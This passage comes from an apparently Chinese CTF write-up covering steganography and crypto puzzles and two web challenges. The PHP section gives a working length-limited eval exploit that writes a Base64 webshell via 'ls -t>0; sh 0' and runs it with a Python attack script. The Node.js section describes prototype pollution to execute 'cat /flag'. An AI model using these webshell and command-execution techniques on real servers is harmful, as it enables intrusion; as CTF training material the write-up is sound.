规则进行解码即可，过程如下：</p>\n<p><img data-src=\"IMG_2175.PNG\" alt=\"IMG_2175\"></p>\n<p>因而 flag 为： <code>susctf&#123;aloha&#125;</code></p>\n<h3 id=\"旺旺的课程表\"><a class=\"markdownIt-Anchor\" href=\"#旺旺的课程表\">#</a> 旺旺的课程表</h3>\n<p>题目如下：</p>\n<p><img data-src=\"task.png\" alt=\"task\"></p>\n<p>拿到图片检查一下长宽是否正确：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#使用 python [脚本文件名] [图片文件名]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> zlib</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> struct</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    all_b <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    crc32key <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>all_b<span class=\"token punctuation\">[</span><span class=\"token number\">29</span><span class=\"token punctuation\">:</span><span class=\"token number\">33</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    data <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span>all_b<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">:</span><span class=\"token number\">29</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    n <span class=\"token operator\">=</span> <span class=\"token number\">4095</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">for</span> w <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        width <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span>struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'>i'</span><span class=\"token punctuation\">,</span> w<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">for</span> h <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            height <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span>struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'>i'</span><span class=\"token punctuation\">,</span> h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                data<span class=\"token punctuation\">[</span>x<span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> width<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                data<span class=\"token punctuation\">[</span>x<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> height<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            crc32result <span class=\"token operator\">=</span> zlib<span class=\"token punctuation\">.</span>crc32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token keyword\">if</span> crc32result <span class=\"token operator\">==</span> crc32key<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"宽为：\"</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>width<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"高为：\"</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>height<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"image-20231014180520256.png\" alt=\"image-20231014180520256\"></p>\n<p><img data-src=\"image-20231014180544950.png\" alt=\"image-20231014180544950\"></p>\n<p>长宽结果没有什么异常。使用 zsteg 也没有发现什么：</p>\n<p><img data-src=\"image-20231014181934718.png\" alt=\"image-20231014181934718\"></p>\n<p>pngcheck 也没有问题（如果某一块没有满但后面却还有 IDAT 块则说明后面的块是 “假” 的），但是都正常：</p>\n<p><img data-src=\"image-20231014182314299.png\" alt=\"image-20231014182314299\"></p>\n<p>进入 Stegsolve 中进行尝试，切换了一下视图，结果发现了 二维码：</p>\n<p><img data-src=\"image-20231014183019450.png\" alt=\"image-20231014183019450\"></p>\n<p>扫描二维码得到如下内容，维吉尼亚密码：</p>\n<pre><code>vigenere:T29tAGSCf2KaZAXeBkylQrsiw3MhR3PocagnRqWrEhX5JYS4PHVlRFGnHb04LFZlPKTlANV3HcSbKHVyEB0uCXpaboShCJTycQEtBETffB4=\n</code></pre>\n<p>题目对课表内容有所提示，猜测是夏多密码。根据如下所示过程可以得到序号所对应的  <code>夏多密码</code> ：</p>\n<p><img data-src=\"3001F020D723381FDA50CD419B8FDE52.png\" alt=\"3001F020D723381FDA50CD419B8FDE52\"></p>\n<p>所以 <code>猜测</code>  维吉尼亚密码的 KEY 为：</p>\n<pre><code>CYBERSECURITY\n</code></pre>\n<p>进行解密得到：</p>\n<pre><code>R29vZCBKb2IgISEgZmxhZzogc3VzY3RmezcwZmUxNzE5LWU4ODEtNDMwZi04NDBkLTBhYTE3ZjUzMGRhMX0sIGhhdmUgYSBuaWNlIGRheX4=\n</code></pre>\n<p>再使用 Base64：</p>\n<p><img data-src=\"image-20231014194422489.png\" alt=\"image-20231014194422489\"></p>\n<p>就可以拿到正确的 flag：</p>\n<p><code>susctf&#123;70fe1719-e881-430f-840d-0aa17f530da1&#125;</code></p>\n<h3 id=\"ai-kerasmodelsummary\"><a class=\"markdownIt-Anchor\" href=\"#ai-kerasmodelsummary\">#</a> AI-keras.Model.summary()</h3>\n<p>题目如下：</p>\n<p><img data-src=\"image-20231016093708125.png\" alt=\"image-20231016093708125\"></p>\n<p>使用 010 打开 keras 文件进行查找：</p>\n<p><img data-src=\"image-20231015102445681.png\" alt=\"image-20231015102445681\"></p>\n<p><code>WelcomeLOLAndhereisyourflag have_fun_with_deep_conv_net</code></p>\n<p>只需要提交带有连字符的部分，即：</p>\n<p><code>have_fun_with_deep_conv_net</code></p>\n<p>因而 flag 为：</p>\n<p><code>susctf&#123;have_fun_with_deep_conv_net&#125;</code></p>\n<h3 id=\"do_u_know_jeremiah_denton\"><a class=\"markdownIt-Anchor\" href=\"#do_u_know_jeremiah_denton\">#</a> Do_u_know_Jeremiah_Denton?</h3>\n<p>题目如下：</p>\n<p><img data-src=\"image-20231016093806751.png\" alt=\"image-20231016093806751\"></p>\n<p>对音频文件进行了常规方法分析后，并没有什么发现，我也不知道 Jeremiah_Denton 是谁，还特意去瞅了瞅，这个人是越战期间用眼睛打摩斯电码的人。但是题目没有任何地方有类似摩斯电码的声音。查看题目提示： <code>private</code> ，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnRtcy5pbS8yMDIxLzAzLzMwL2N0Zi1tcDMtY29weXJpZ2h0LWJpdC5odG1s\">搜索了一下</span>发现了利用 <code>private bit</code>  隐藏信息的方法，于是把文件丢入 010 中进行查看：</p>\n<p><img data-src=\"image-20231015151251449.png\" alt=\"image-20231015151251449\"></p>\n<p>可以看出，第一个帧块的开始地址是  <code>0x19C</code> , 且当 padding 为 0 是，帧大小为  <code>0x1A1</code> ，padding 为 1 时，帧大小为  <code>0x1A2</code> ，private 位置是帧的第二字节的倒数第一位，padding 位置是帧的第二字节的倒数第二位。构建脚本获取所有帧所包含的 private 的值，并将其转为 ASCII：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> binascii</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">0x19C</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x2</span>  <span class=\"token comment\"># 起始位置</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin\">file</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'QueenCard.mp3'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 提取</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">while</span> n <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x27119C</span><span class=\"token operator\">+</span><span class=\"token number\">0x1A1</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 结束位置</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>seek<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    head <span class=\"token operator\">=</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    padding <span class=\"token operator\">=</span> <span class=\"token string\">'&#123;:08b&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>head<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>seek<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    file_read_result <span class=\"token operator\">=</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    result <span class=\"token operator\">+=</span> <span class=\"token string\">'&#123;:08b&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>file_read_result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    n <span class=\"token operator\">+=</span> <span class=\"token number\">0x1A2</span> <span class=\"token keyword\">if</span> padding <span class=\"token operator\">==</span> <span class=\"token string\">\"1\"</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0x1A1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># 拼接</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>textArr <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">'.&#123;'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'&#125;'</span><span class=\"token punctuation\">,</span> result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> textArr<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    flag <span class=\"token operator\">=</span> flag <span class=\"token operator\">+</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>运行得到 flag：</p>\n<p><img data-src=\"image-20231016093926131.png\" alt=\"image-20231016093926131\"></p>\n<p><code>susctf&#123;3fa723a9-92c1-17fc-8364-50457b1e95c6&#125;</code></p>\n<h3 id=\"问卷调查\"><a class=\"markdownIt-Anchor\" href=\"#问卷调查\">#</a> 问卷调查</h3>\n<p><code>susctf&#123;Th4nK_Y0u_F0R_Y0UR_Partic1pa71oN&#125;</code></p>\n<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> web</h2>\n<h3 id=\"php-is-all-you-need\"><a class=\"markdownIt-Anchor\" href=\"#php-is-all-you-need\">#</a> PHP Is All You Need</h3>\n<p>题目如下所示：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// Revenge of last year's signin challenge</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// Now you can't use a webshell tool to connect :)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">20</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>该题目对输入的字符数目有所限制，对于这类题目，经过<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS91XzE1ODc4NTY4LzU4NTk3MjI=\">互联网学习</span>，有一种通用解法如下所示：</p>\n<p>首先将需要写入的语句进行 Base64 编码，避免特殊字符：</p>\n<p><img data-src=\"image-20231013184410011.png\" alt=\"image-20231013184410011\"></p>\n<p>再构建需要执行的语句：</p>\n<pre><code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php\n</code></pre>\n<p>对于上述需要执行的语句，我们可以通过在目录中构建以字符为命名的文件，利用 <code>ls -t&gt;0</code>  使其写入 0 文件，再利用 shell 执行文件 0，构建我们所需要的 1.php 文件：</p>\n<pre><code>&gt;hp\n&gt;1.p\\\\\n&gt;d\\&gt;\\\\\n&gt;\\ -\\\\\n&gt;e64\\\\\n&gt;bas\\\\\n&gt;7\\|\\\\\n&gt;XSk\\\\\n&gt;Fsx\\\\\n&gt;dFV\\\\\n&gt;kX0\\\\\n&gt;bCg\\\\\n&gt;XZh\\\\\n&gt;AgZ\\\\\n&gt;waH\\\\\n&gt;PD9\\\\\n&gt;o\\ \\\\\n&gt;ech\\\\\nls -t&gt;0\nsh 0\n</code></pre>\n<p>使用如下脚本进行攻击：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://game.ctf.seusus.com:38248/index.php?cmd=system('&#123;0&#125;');\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+]start attack!!!\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/mnt/e/ramDownload/payload.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*]\"</span> <span class=\"token operator\">+</span> url<span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#检查是否攻击成功</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>test <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"http://game.ctf.seusus.com:38248/index.php\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span> test<span class=\"token punctuation\">.</span>status_code <span class=\"token operator\">==</span> requests<span class=\"token punctuation\">.</span>codes<span class=\"token punctuation\">.</span>ok<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*]Attack success!!!\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"image-20231013195922046.png\" alt=\"image-20231013195922046\"></p>\n<p>利用 ls 查看当前的目录文件，可以发现，已经成功生成相关文件以及 1.php 。</p>\n<p><img data-src=\"image-20231013195744753.png\" alt=\"image-20231013195744753\"></p>\n<p>利用以下语句得到我们的文件，并查看到 flag：</p>\n<pre><code>1.php?1=system(&quot;cat f1ag_c7271.php&quot;);\n</code></pre>\n<p><img data-src=\"image-20231013195653670.png\" alt=\"image-20231013195653670\"></p>\n<p><code>susctf&#123;php is easy af0c79401aea&#125;</code></p>\n<h3 id=\"pollut-me\"><a class=\"markdownIt-Anchor\" href=\"#pollut-me\">#</a> pollut me</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuNTFjdG8uY29tL2FydGljbGUvNzUxMzg4Lmh0bWw=\">node.js 污染</span></p>\n<p>将源代码下载下来进行解读，发现里面已经有了一个用户 test，用 test 进行登录，并尝试修改自己的信息，利用修改信息调用 merge 可以触发原型链污染，代码中提示我们 flag 在 /flag 中，我们可以加入 <code>__proto__</code> 属性 &quot;eval_item&quot;，其值是 cat /flag，这样就会通过 if 判断，进行执行。</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 修改信息页面</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/update-info'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    res<span class=\"token punctuation\">.</span><span class=\"token function\">sendFile</span><span class=\"token punctuation\">(</span>__dirname <span class=\"token operator\">+</span> <span class=\"token string\">'/public/update-info.html'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">// 处理修改信息请求</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  app<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/update-info'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'body-parser'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">let</span> username <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">let</span> user <span class=\"token operator\">=</span> users<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">u</span> <span class=\"token operator\">=></span> u<span class=\"token punctuation\">.</span>username <span class=\"token operator\">===</span> username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">,</span>req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      res<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">message</span><span class=\"token operator\">:</span> <span class=\"token string\">'姓名更新成功'</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>users<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">u</span> <span class=\"token operator\">=></span> u<span class=\"token punctuation\">.</span>username <span class=\"token operator\">===</span> username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">'用户未找到。'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/eval\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span>res</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">let</span> test<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">.</span>eval_item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token comment\">//in one contains, you can do eval only once,now i tell you flag in /flag</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token keyword\">const</span> <span class=\"token punctuation\">&#123;</span> execSync <span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child_process'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  res<span 